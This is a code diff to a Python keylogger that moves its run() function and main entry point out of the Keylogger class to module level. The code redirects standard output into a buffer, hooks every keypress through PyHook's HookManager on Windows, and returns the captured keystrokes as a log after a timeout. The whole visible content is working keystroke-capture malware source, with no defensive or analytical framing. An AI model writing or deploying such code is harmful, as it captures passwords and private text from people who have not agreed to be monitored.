@@ -71,22 +71,24 @@ class Keylogger:
                 print(f'{event.Key}')
         return True # Callback returns true to allow next hook
 
-    def run():
-        save_stdout = sys.stdout
-        sys.stdout = StringIO()
+def run():
+    save_stdout = sys.stdout
+    sys.stdout = StringIO()
         
-        kl = Keylogger() # Keylogger obj 
-        hm = PyHook.HookManager() # Def PyHook HookManager
-        hm.KeyDown = kl.mykeystroke # Bind 𝘒𝘦𝘺𝘋𝘰𝘸𝘯 𝘦𝘷𝘦𝘯𝘵 to 𝘮𝘺𝘬𝘦𝘺𝘴𝘵𝘳𝘰𝘬𝘦()
-        hm.HookKeyboard() # Hook al keypresses 
-        while time.thread_time()<TIMEOUT: 
-            # Continue exec until 𝘛𝘐𝘔𝘌𝘖𝘜𝘛
-            pythoncom.PumpWaitingMessages()
-        log = sys.stdout.getvalue()
-        sys.stdout = save_stdout
-        return log
+    kl = Keylogger() # Keylogger obj 
+    hm = PyHook.HookManager() # Def PyHook HookManager
+    hm.KeyDown = kl.mykeystroke # Bind 𝘒𝘦𝘺𝘋𝘰𝘸𝘯 𝘦𝘷𝘦𝘯𝘵 to 𝘮𝘺𝘬𝘦𝘺𝘴𝘵𝘳𝘰𝘬𝘦()
+    hm.HookKeyboard() # Hook al keypresses 
+   
+    while time.thread_time()<TIMEOUT: 
+        # Continue exec until 𝘛𝘐𝘔𝘌𝘖𝘜𝘛
+        pythoncom.PumpWaitingMessages()
+        
+    log = sys.stdout.getvalue()
+    sys.stdout = save_stdout
+    return log
 
-    if __name__ == "__main__":
-        print(run())
-        print('done.')
+if __name__ == "__main__":
+    print(run())
+    print('done.')
     
